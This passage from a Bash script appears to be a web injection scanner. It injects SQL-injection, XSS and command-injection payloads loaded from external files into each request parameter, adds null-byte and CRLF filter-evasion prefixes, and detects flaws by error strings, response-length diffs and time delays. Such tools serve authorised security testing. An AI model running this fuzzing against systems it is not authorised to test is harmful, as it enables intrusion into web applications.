			# Cookie: security=high; PHPSESSID=67pq8ivtjaj485sbvck5fs8c87; acopendivids=phpbb2,redmine; acgroupswithpersist=nada
			# Content-Length: 20
			#	
			# ip=qwe&submit=submit
			# ======================================================
			lineflag=$((lineflag+1))
		fi
		N=$((N+1))
	done

	rm 2scannerinputlist.txt 2>/dev/null

	# if Method swapping has been specified, add a GET for each POST and vice-versa:
	# btw, if a POST request is normal (i.e. no URI params), then the body params are preceded by a single '?'
	# however, if a POST request has URI parameters, then these are preceded by a '?', while the POST body params are preceded by '??'
	if [ true = "$W" ] ; then
		cat 1scannerinputlist.txt | while read i;
			do methodical=`echo $i | cut -d " " -f 1`
			if [[ "$methodical" =~ "POST" ]]; then
				echo GET `echo $i | cut -d " " -f2 | replace '??' '&'` >> 2scannerinputlist.txt 
				echo POST `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt
			else
				echo GET `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt 
				echo POST `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt
				#the above line causes GET params to be passed as POST body params, otherwide they'd be treated as POST URI params	
			fi
		done
	else 
		cp 1scannerinputlist.txt 2scannerinputlist.txt	
	fi

#cat 2scannerinputlist.txt
#exit
	#sort uniq the list and also clean out log entries that you dont want to be scanning:
	cat 2scannerinputlist.txt | grep -v "\(\.png\|\.jpg\|\.css\|\.bmp\|\.gif\)" | sort | uniq > 3scannerinputlist.txt

	#need some code to double up the post reqs with params:
	#this is to support scanning of POST URIs
	#where a POST with URIs is found, first time it'll scan the POST URIs, next time it'll scan the POST data params. (or the other way round.. i cant remember)
	#hence we need duplicates of POST requests that have POST URIs.
	#this has to be done after the | sort | uniq
	cat 3scannerinputlist.txt | while read LINE; do
		echo -n "."
		echo $LINE >> scannerinputlist.txt
		if [[ $LINE =~ $post && $LINE =~ $question$question ]]; then
			echo $LINE >> scannerinputlist.txt
		fi
	done
			
	#as 1scannerinputlist.txt (and its friends) is accumulative by nature, it must be cleared down 
	rm 1scannerinputlist.txt 2>/dev/null	
	rm 2scannerinputlist.txt 2>/dev/null	
	rm 3scannerinputlist.txt 2>/dev/null
fi

#OPTIONAL URL connection testing routine:
if [ true = "$T" ] ; then
	echo "Testing connection to $testurl" 
	testresult=`curl $testurl -v -o testoutput.html --cookie $cookie $curlproxy $httpssupport -w %{http_code}:%{size_download}`
	testresultstatus=`echo $testresult | cut -d ":" -f 1`
	testresultlength=`echo $testresult | cut -d ":" -f 2`
	echo "The status code was "$testresultstatus 
	echo "The response length was "$testresultlength
	echo "The output has been saved as testoutput.html" 
	exit
fi

#An input file has been specified:
if [ true = "$I" ] ; then
	rm scannerinputlist.txt 2>/dev/null
	echo "Parsing input file" $inputFile
	cat "$inputFile" | while read quack; do
		echo $quack >> scannerinputlist.txt
	done
	echo "Parsed input file $inputFile" 
fi

#as both the below lists are accumulative ny nature, they must first be cleared down before they are used:
rm cleanscannerinputlist.txt 2>/dev/null
rm exceptionlist.txt 2>/dev/null

if [ false = "$o" ] ; then
	#identify any risky request URLs
	cat scannerinputlist.txt | while read quack; do
		textsearch=`echo $quack | grep -i "\(logoff\|login\|logout\|exit\|signout\|delete\|signoff\|password\)"`
		if [[ "$textsearch" != "" ]] ; then
			echo $quack >> exceptionlist.txt
		else
			echo $quack >> cleanscannerinputlist.txt
			echo -n "."
		fi
	done
else
	cp scannerinputlist.txt cleanscannerinputlist.txt;
fi

if [ true = "$P" ] ; then
	cat scannerinputlist.txt | while read quack; do
		echo $quack >> $parseOutputFile
	done
	echo "Input file $parseOutputFile created"
	echo "The following potentially risky URLs (if any) were removed: " >> urltested.txt
	cat exceptionlist.txt >> urltested.txt
	echo "	*	*	*	*	*	*" >> urltested.txt
	echo "The following URLs were added: " >> urltested.txt
	cat cleanscannerinputlist.txt >> urltested.txt
	cat urltested.txt
	rm urltested.txt 2>/dev/null	
	exit
fi


entries=`wc -l cleanscannerinputlist.txt | cut -d " " -f 1`

#cat cleanscannerinputlist.txt

echo ""
echo "Scan list created with $entries entries" 
echo "Saving a .input file (including risky requests) to: ./session/$safehostname.$safelogname.input" 
cp scannerinputlist.txt ./session/$safehostname.$safelogname.input

rm scannerinputlist.txt 2>/dev/null


#echo "debugGOT  HERE"
#exit

exceptions=`cat exceptionlist.txt 2>/dev/null`
if [[ "$exceptions" != "" ]] ; then
	cat exceptionlist.txt 2>/dev/null 
	echo "The URLs listed above are potentially risky and will be excluded from scanning. Run the scan again using the -o option to include them."
	echo -n "Enter y to continue or n to quit: "
	read keyinput
		if [[ "$keyinput" == "n" ]] ; then
		exit;
	fi
fi

rm exceptionlist.txt 2>/dev/null

#######Prep the param list section########

#the output of this section will be a list of payloads called payloads.txt

#clear down the payloads.txt list incase it has entries left in it
rm payloads.txt 2>/dev/null

##this section concatenates payload list files based on user input###

if [ true = "$s" ] ; then
	if [ true = "$D" ] ; then	
		cat ./payloads/stringpayloads.$dbms.txt | while read quack; do
			echo $quack >> payloads.txt
		done
	else
		cat ./payloads/stringpayloads.txt | while read quack; do
			echo $quack >> payloads.txt
		done
	fi
fi

if [ true = "$n" ] ; then
	cat ./payloads/numericpayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi	

if [ true = "$e" ] ; then
	if [ true = "$D" ] ; then	
		cat ./payloads/timedelaypayloads.$dbms.txt | while read quack; do
			echo $quack | replace "X" $timedelay >> payloads.txt
		done
	else
		cat ./payloads/timedelaypayloads.txt | while read quack; do
			echo $quack | replace "X" $timedelay >> payloads.txt
		done
	fi
fi

if [ true = "$b" ] ; then
	cat ./payloads/commandpayloads.txt | while read quack; do		
		echo $quack | replace "X" $timedelay >> payloads.txt
	done
fi

if [ true = "$q" ] ; then
	cat ./payloads/quotepayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

if [ true = "$j" ] ; then
	cat ./payloads/all_attacks.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

if [ true = "$r" ] ; then
	cat ./payloads/encodedquotepayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

if [ true = "$Y" ] ; then 
	cat ./payloads/xsspayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

# this code scans through a custom payload list and replaces 'X' with the $timedelay value:
# this allows users to specifiy their own timedelay sqli payloads:
if [ true = "$C" ] ; then
	cat $custompayloadlist | while read quack; do
		echo $quack | replace "X" $timedelay >> payloads.txt
	done
fi

#flatten this down just in case theres an old version lying about:
rm nullpayloads.txt 2>/dev/null

# this code prepends each payload with a %00, sometimes useful for filter evasion:
if [ true = "$A" ] ; then
	cat payloads.txt | while read quack; do
		echo "%00"$quack >> nullpayloads.txt
	done
	cat nullpayloads.txt > payloads.txt
	rm nullpayloads.txt 2>/dev/null
fi

# this code prepends each payload with a %0d%0a, sometimes useful for filter evasion:
if [ true = "$B" ] ; then
	cat payloads.txt | while read quack; do
		echo "%0d%0a"$quack >> nullpayloads.txt
	done
	cat nullpayloads.txt > payloads.txt
	rm nullpayloads.txt 2>/dev/null
fi

totalpayloads=`wc -l payloads.txt | cut -d " " -f 1`
echo "Payload list created with $totalpayloads entries" 


#MANDATORY URL connection testing routine:
if [ false = "$G" ] ; then
	#message in red
	echo "Attempting a test connection to $uhostname" 
	testresult=`curl $uhostname -v $curlproxy $httpssupport -w %{http_code}:%{size_download}`
	testresultstatus=`echo $testresult | cut -d ":" -f 1`
	testresultlength=`echo $testresult | cut -d ":" -f 2`
	#echo "The status code was "$testresultstatus 
	echo ""
	echo "" 
	if [[ $testresultstatus == "000" ]]
		then echo "No meaningful headers returned: please check your settings or set the -G flag to skip the connection check."
		exit
	else
		echo "Connection looks good."
	fi		
fi

#original location of session file check

#this IF statement creates list of params to skip based on a user-supplied list, or using the default list.
rm ./parameters_to_skip.txt 2>/dev/null
if [ true = "$S" ] ; then					
	cat $parameterstoskip | while read quack; do
		echo $quack >> parameters_to_skip.txt
	done
else 
	cat ./payloads/default_parameters_to_skip.txt | while read quack; do
		echo $quack >> parameters_to_skip.txt
	done
fi

#################scanner section#########################
K=0
####### scanning loop #############

#this line makes sure we have specified a payload type
if [[ true = "$n" || true = "$s" || true = "$e" || true = "$b" || true = "$q" || true = "$r" || true = "$Y" || true = "$C" ]] ; then

#message in red
echo -e '\E[31;48m'"\033[1mScan commenced\033[0m"
tput sgr0 # Reset attributes.

### new scanning engine ###
##BEGINING OF PER-URL LOOP:
firstPOSTURIURL=0
# the firstPOSTURIURL flag handles situations where POST requests have URI parmeters and has three states: 
# 0 no postURI params (this must be a GET or a normal POST)
# 1 postURI param detected, fuzz the postURI params, send the post data params as a static string
# 2 postURI param detected, fuzz the post data params, send the postURI params as a static string

firstrunflag=0	
vulnerable=0

echo "" > ./session/$safehostname.$safelogname.oldURL.txt
echo "" > ./session/$safehostname.$safelogname.oldparamlist.txt

cat cleanscannerinputlist.txt | while read i; do
	methodical=`echo $i | cut -d " " -f 1`
	if [[ $i =~ $question$question && "$methodical" =~ "POST" ]] ; then
		#increment the firstPOSTURIURL flag: 
		firstPOSTURIURL=$((firstPOSTURIURL+1)) 
	fi
	#echo "DEBUG! firstPOSTURIURL=$firstPOSTURIURL"
	#echo "DEBUG! i= $i"
	K=$((K+1)); #this is a request counter
	#echo "debug outerloop"
	continueflag=0
	alreadyscanned=0
	#had to store some loop params in text files as they kept getting cleared down
	#have to initialise these values at the start of the loop: 
	sessionStorage=0
	echo $sessionStorage > ./session/$safehostname.$safelogname.sessionStorage.txt
	and1eq1=0
	echo $and1eq1 > ./session/$safehostname.$safelogname.and1eq1.txt

	if [ true = "$L" ] ; then
		# session liveness check was requested
		checkpage=`curl $canaryRequest -o dump.txt --cookie $cookie $curlproxy $httpssupport`
		cat dump.txt 2>/dev/null | egrep -o $canaryRequestSearchString > search.txt
		search=`cat search.txt`
		if [[ $search != "" ]]
			then echo "Session is valid"
		else	
			echo "Halting as session is invalid. Resume at request number "$K
			break
		fi
	fi
	# resume routine to allow users to resume a scan from a given request number
	if [ true = "$Q" ] ; then
		if (($K<$resumeline))
			then echo "Skipping request number "$K
			continue 3
		fi
	fi
	method=`echo $i | cut -d " " -f 1`
	
	#work out what the page value is. for a firstPOSTURIURL value of 2, set the page to be the page AND the postURI params
	#for everything else, the page is the page... 
	if [ $firstPOSTURIURL == 2 ] ; then 
		page=`echo $i | cut -d " " -f 2 | cut -d "?" -f 1,2`
	else
		page=`echo $i | cut -d " " -f 2 | cut -d "?" -f 1`
	fi
	#echo "debug page "$page;	
	
	#now work out the params that will be fuzzed in this loop iteration
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
			params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
			static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
		fi
		if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
			params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
			static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
		fi
	else #we are dealing with a simple GET request
		params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
	fi
	
	#echo "debug params "$params;				
	stringofparams=`echo $params | tr "&" " "`
	
	#echo `echo $stringofparams` >> ./session/$safehostname.$safelogname.siteanalysis.txt	

	#code that compares the current URL and params for comparison against the old URL - this can be used to skip params already scanned
	#newURL=`echo $i | cut -d "?" -f 1| cut -d " " -f2`
	newURL=`echo $i | cut -d "?" -f 1`
	newParams=$stringofparams
	oldURL=`cat ./session/$safehostname.$safelogname.oldURL.txt`
	#oldParams=`cat ./session/$safehostname.$safelogname.oldParams.txt`

	#if the current and last urls dont match, clear down the lists
	#we want these lists to grow across a given URL, but re-start
	#when a new URL comes along
	if [[ "$oldURL" == "$newURL" ]] ; then
		if [[ "$firstrunflag" == 0 || "$K" == "$entries" ]] ; then
			echo "------------------" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			echo "$newURL" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			for dfg in $stringofparams; do
				echo `echo $dfg | cut -d "=" -f1` >> ./session/$safehostname.$safelogname.siteanalysis.txt
			done
			firstrunflag=1
			#this branch is taken for the first and last URLs, otherwise these wouldent be captured in the siteanalysis log
		fi
	else
		if [[ "$firstrunflag" == 0 || "$K" == "$entries" ]] ; then
			echo "------------------" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			echo "$newURL" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			for dfg in $stringofparams; do
				echo `echo $dfg | cut -d "=" -f1` >> ./session/$safehostname.$safelogname.siteanalysis.txt
			done
			firstrunflag=1
			#this branch is taken for the first and last URLs, otherwise these wouldent be captured in the siteanalysis log
		else
			#this branch is taken when a new URL comes along
			#the below writes out the old URL and paramlist info to the siteanalysis log
			
			echo "------------------" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			echo "$oldURL" >> ./session/$safehostname.$safelogname.siteanalysis.txt
			cat ./session/$safehostname.$safelogname.oldparamlist.txt >> ./session/$safehostname.$safelogname.siteanalysis.txt
			#the below clears away the old paramlist
			echo "" > ./session/$safehostname.$safelogname.oldparamlist.txt
		fi
	fi
	paramsarray=($stringofparams)
	#echo "debug paramsarray "${paramsarray[*]};
	output='';
	arraylength=${#paramsarray[*]}
	((arraylengthminusone=$arraylength-1))
	#echo "debug arraylengthminusone " $arraylengthminusone
	#this flag will track which param we are fuzzing (lets initialise it down to 0): 	
	paramflag=0
	##BEGINING OF PER-PARAMETER LOOP
	for paramstring in ${paramsarray[*]}; do
		#echo "DEBUG-perparam! sessionStorage=$sessionStorage"	
		#this line is where we include the payload path string:
		#here we are going to feed in our newly compiled payload list:
		((payloadcounter=0))		
		##BEGINING OF PER-PAYLOAD LOOP
		cat payloads.txt | while read payload; do
			#echo "DEBUG-perpayload! sessionStorage=$sessionStorage"	
			#payloadcounter is not used for logic, it just presents the user with the payload number			
			payloadcounter=$((payloadcounter+1))
			#echo "debug payload counter: $payloadcounter"
			# the output buffer will hold the final string of params including the injected param and the normal ones
			# lets clear it down at the begining of the loop:
			output=''
			# for each parameter in a given URL we need to create a request where one of the parameters has 
			# a payload injected but all the others are 'normal'. A normal request like this:
			# http://www.foobar.com/foo.aspx?a=1&b=2&c=3
			# ... should be fuzzed like this:
			# http://www.foobar.com/foo.aspx?a=PAYLOAD&b=2&c=3
			# http://www.foobar.com/foo.aspx?a=1&b=PAYLOAD&c=3
			# http://www.foobar.com/foo.aspx?a=1&b=2&c=PAYLOAD
			# so, we need an inner loop that will, for each parameter in the URL
			# create a request with one injected parameter.
			# we will use the paramflag variable to determine which param is to be injected.
			# y will be the innerloop iterator. where y=paramflag, we will inject our payload.
			# note that while y increments for each loop iteration, paramflag does not 
			for (( y = 0; y <= $arraylengthminusone; y += 1 )); do
				#echo "debug payload "$payload;	
				#echo "debug y="$y;
				#echo "debug paramflag="$paramflag;
				# below is the url encoding scheme which is applied to payloads - its not perfect, but works most of the time 
				if (( $y == $paramflag )) ; then 
					testpayload=$payload
					#removing the encoding stage here; creating a single sendrequest() function so that all output goes through the same code
					#then i can add custom encoding options that will affect ALL requests. hope this works :-)
					#testpayload=`echo $payload | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c"`
					#inject the payload into this parameter:
					output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$testpayload
					#echo "output after payload injection $output";
					#echo "debug paramsarray at y " ${paramsarray[$y]};
					paramtotest=`echo ${paramsarray[$y]} | cut -d "=" -f1`
					#echo "debug paramtotest: "$paramtotest;
					#check to see if the current parameter should be skipped:
					for paramcheck in `cat parameters_to_skip.txt`; do
						if [[ "$paramcheck" == "$paramtotest" ]]; then
							continueflag=1
							break
						fi
					done
					#this code looks to see if we've already scanned this parameter of this URI:
					#if we have, the param gets skipped
					if [[ "$oldURL" == "$newURL" ]] ; then
						#echo "URL MATCH Detected!"
						for paramcheckold in `cat ./session/$safehostname.$safelogname.oldparamlist.txt`; do
							#paramcheckold=`echo $paramcheck2| cut -d "=" -f 1`
							#echo "checking if param matches $paramcheckold";
							if [[ "$paramcheckold" == "$paramtotest" ]]; then
								continueflag=1
								alreadyscanned=1
								#echo "match: $paramcheckold = $paramtotest"
								break
							fi
						done
					fi					
				else 	
					#we are not injecting this parameter, so print it out as normal:
					output=$output${paramsarray[$y]}
				fi
				#this line works out if we need to append an & to the parameter value:
				if (($y == $arraylengthminusone))
					then foobar="foobar"
					#no need to add a '&' suffix to $output as no more params left to add...
				else 
					output=$output"&" 
				fi
				#if we are testing the last parameter, we have a full list of params ready to go to the scanner:				
				if (($y == $arraylengthminusone))
					###IMPORTANT: this instruction MUST BE HERE!!!:
					then asd=1

					cleanoutput=$output

					#encode output and params variables without chaning the variable name
					encodeinput=$params
					encodeme
					params=$encodeoutput

					encodeinput=$output
					encodeme
					output=$encodeoutput

					encodeinput=$static
					encodeme
					static=$encodeoutput
 
					#create two requests - one clean, one evil
					r=$uhostname$page"?"$output
					i=$uhostname$page"?"$params
					if (( $continueflag == 1 )); then
						if (( $alreadyscanned == 1 )); then
							alreadyscanned=0
							if [[ true != "$F" ]]; then
								continueflag=0
								continue
							fi
						else
							echo "Skipping param $paramtotest as it's on the don't scan list"
							continueflag=0
							continue
						fi
					fi
					# end of request preparation section
					# beginning of request section
					# this section is written confusingly:
					# first we do clean & evil GET requests
					# then we do clean & evil POST requests
					# but POST requests are split out three ways: normal POST, POST URI params, POST data params
					# also, we only send one good request per URL instead of one per parameter

					
					sessionStorage=`cat ./session/$safehostname.$safelogname.sessionStorage.txt 2>/dev/null`
					if [[ $method != "POST" ]]; then #we're doing a get - simples					
						if [[ "$sessionStorage" = 0 ]] ; then
							#write set sessionStorage to 1 to prevent clean requests being sent for each param:
							sessionStorage=1
							echo $sessionStorage > ./session/$safehostname.$safelogname.sessionStorage.txt
							# send a 'normal' request
							and1eq1=`curl $i -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
							echo $and1eq1 > ./session/$safehostname.$safelogname.and1eq1.txt
							echo "Testing URL $K of $entries GET $i"
						fi
						#echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
						and1eq2=`curl $r -o dumpfile --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
					# right, thats it for clean and evil GET requests. now POSTs:
					else	# we're doing a POST - not so simple...
						# we only need to send a clean request if we are doing time diffing and we havent already sent one for this URL
						# TODO move the below IF to the next level up:
						# it should encapsulate both clean GETs and clean POSTS, not just clean POSTS
						if [[ "$sessionStorage" == 0 && true = "$e" || true = "$b" ]] ; then
							# send a 'normal' POST request
							if (($firstPOSTURIURL>0)) ; then
								if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
									and1eq1=`curl -d "$static" $uhostname$page"?"$params -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
									#write set sessionStorage to 1 to prevent clean requests being sent for each param:
									sessionStorage=1
									echo $sessionStorage > ./session/$safehostname.$safelogname.sessionStorage.txt
									echo $and1eq1 > ./session/$safehostname.$safelogname.and1eq1.txt
									echo "Testing URL $K of $entries POST $uhostname$page?$params??$static" 	
								fi
								if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
									and1eq1=`curl -d "$params" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`;
									sessionStorage=1
									echo $sessionStorage > ./session/$safehostname.$safelogname.sessionStorage.txt
									echo $and1eq1 > ./session/$safehostname.$safelogname.and1eq1.txt
									echo "Testing URL $K of $entries POST $uhostname$page??$params" 
								fi
							else #just a normal POST:
								and1eq1=`curl -d "$params" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
								#write set sessionStorage to 1 to prevent clean requests being sent for each param:
								sessionStorage=1
								echo $sessionStorage > ./session/$safehostname.$safelogname.sessionStorage.txt
								echo $and1eq1 > ./session/$safehostname.$safelogname.and1eq1.txt
								echo "Testing URL $K of $entries POST $uhostname$page?$params" 		
							fi						
						fi
						# send an 'evil' POST request
						if (($firstPOSTURIURL>0)) ; then
							if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
								and1eq2=`curl -d "$static" $uhostname$page"?"$output -o dumpfile --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
								echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"	
							fi
							if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
								and1eq2=`curl -d "$output" $uhostname$page -o dumpfile --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
								echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
							fi
						else #just a normal evil POST:
							echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
							and1eq2=`curl -d "$output" $uhostname$page -o dumpfile --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
						fi
					fi
					#end of request section
					#beginning of response parsing section
                                        
					#check the response code and alert the user if its not 200:					
					reponseStatusCode=`echo $and1eq2 | cut -d ":" -f 1`;
					if [[ "$reponseStatusCode" != "200" && "$reponseStatusCode" != "404" ]]
						then echo "ALERT: Status code "$reponseStatusCode" response";
					fi 
					#xss testing subsection
					if [ true = "$Y" ] ; then
						cat ./dumpfile | grep -i -o "$payload" > search.txt;
						search=`cat search.txt`;
						if [[ $search != "" ]] ; then
							if [[ $method != "POST" ]] ; then  #we're doing a get - simples
								echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt;
								echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output";
							else
								if (($firstPOSTURIURL>0)) ; then
									if [ $firstPOSTURIURL == 1 ] ; then
										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safefilename$safelogname.txt;
										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output"
									else
										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safefilename$safelogname.txt;
										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output"
									fi
								else
									#normal post
									echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt;
									echo -e '\E[31;48m'"\033[1m[XSS: $paramtotest REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
									tput sgr0 # Reset attributes.
								fi
							fi							
						fi
					fi	
					#this subsection scans responses for common error strings:			
					cat ./payloads/errors-two-words.txt | while read z; do 
						cat ./dumpfile | egrep -i -o $z > search.txt;
						search=`cat search.txt`;
						if [[ $search != "" ]] ; then 
							if [[ $method != "POST" ]]; then #we're doing a get - simples
								echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt;
								echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
								tput sgr0 # Reset attributes.
							else
								if (($firstPOSTURIURL>0)) ; then
									if [ $firstPOSTURIURL == 1 ] ; then
										echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safefilename$safelogname.txt
										echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
										tput sgr0 # Reset attributes.
									else
										echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safefilename$safelogname.txt
										echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
										tput sgr0 # Reset attributes.
									fi
								else
									#normal post
									echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt
									echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
									tput sgr0 # Reset attributes.
								fi
							fi		
						fi
					done
					#end of subsection that scans for common error strings									
					#beginning of response lenth diffing section
					if [[ "$payload" =~ "345" || "$payload" =~ "dfth" ]]
						then SQLequallength=`echo $and1eq2 | cut -d ":" -f 2`
					fi

					if [[ "$payload" =~ "456" || "$payload" =~ "fghi" ]]
						then SQLunequallength=`echo $and1eq2 | cut -d ":" -f 2`
					fi

					if [[ "$SQLequallength" != "" && "$SQLunequallength" != "" ]]
						then ((answer=$SQLequallength-$SQLunequallength))
						SQLequallength=""
						SQLunequallength=""
						# the payload is an or 1=1: if its not longer, its not worked
						if [ $answer -gt 4 ] ; then
						#set the vulnerable flag and sploit that mutha
						vulnerable=1
						#this line writes out the difference between the responses from the 'clean' and 'evil' requests: 
						diff ./dump ./dumpfile --suppress-common-lines > ./responsediffs/$safefilename-respdiff-R-$K-P-$payloadcounter.txt
							if [[ $method != "POST" ]]; then #we're doing a get - simples 
								echo "[LENGTH-DIFF $answer REQ:$K $safefilename-respdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt
								echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$output" ;
								tput sgr0 # Reset attributes.
							else
								if (($firstPOSTURIURL>0)) ; then
									if [ $firstPOSTURIURL == 1 ] ; then
										echo "[LENGTH-DIFF $answer REQ:$K $safefilename-respdiff-R-$K-P-$payloadcounter.txt ] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safefilename$safelogname.txt
										echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output";
										tput sgr0 # Reset attributes.
									else
										echo "[LENGTH-DIFF $answer REQ:$K $safefilename-respdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"??"$output" >> ./output/$safefilename$safelogname.txt
										echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF $answer REQ:$K]\033[0m $method URL: $uhostname$page"??"$output";
										tput sgr0 # Reset attributes.
									fi
								else
									#normal post
									echo "[LENGTH-DIFF $answer REQ:$K $safefilename-respdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt
									echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
									tput sgr0 # Reset attributes.
								fi
							fi
						fi
					fi
					#end of response lenth diffing subsection
					#beginning status code and error checking subsection
					#this searches through the response looking for a provided error string:
					cat ./dumpfile | egrep -o "$ErrorString" > search.txt
					search=`grep "$ErrorString" search.txt`
					if [[ $search == "$ErrorString" ]]
						then echo "Application error page - skipping "$r >> ./output/$safefilename$safelogname.txt
					elif [[ $search != "$ErrorString" ]] ; then
						#continue only if the default error page has not been found run the scan...
						# the new result format is 404:4040:0.404
						# separate out the http status code from the response:
						and1eq2status=`echo $and1eq2 | cut -d ":" -f 1`
						((status=$and1eq2status))
						if (($status == "500")) 
							then echo "[STATUS-CODE: $status REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.status.txt 				
						fi
						#if (($status == "302")) 
						#	then echo "[STATUS-CODE: $status REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.status.txt
						#fi
						#end of status code and error checking subsection
						#beginning of time diff scan subsection
						timedelay=0
						if [[ true = "$e" || true = "$b" ]] ; then
							and1eq1=`cat ./session/$safehostname.$safelogname.and1eq1.txt 2>/dev/null`
							and1eq1time=`echo "$and1eq1" | cut -d ":" -f 3| cut -d "." -f1`
							and1eq2time=`echo "$and1eq2" | cut -d ":" -f 3| cut -d "." -f1`
							((time_diff=and1eq2time-and1eq1time))
							if (($and1eq2time>$and1eq1time)) ; then
							#set the vulnerable flag and sploit that mutha
							vulnerable=1
							timedelay=1
								if [[ $method != "POST" ]] ; then #we're doing a get - simples
									echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt 
									echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
									tput sgr0 # Reset attributes.
								else
									if (($firstPOSTURIURL>0)) ; then
										if [ $firstPOSTURIURL == 1 ] ; then
											echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safefilename$safelogname.txt
											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
											tput sgr0 # Reset attributes.
										else
											echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safefilename$safelogname.txt
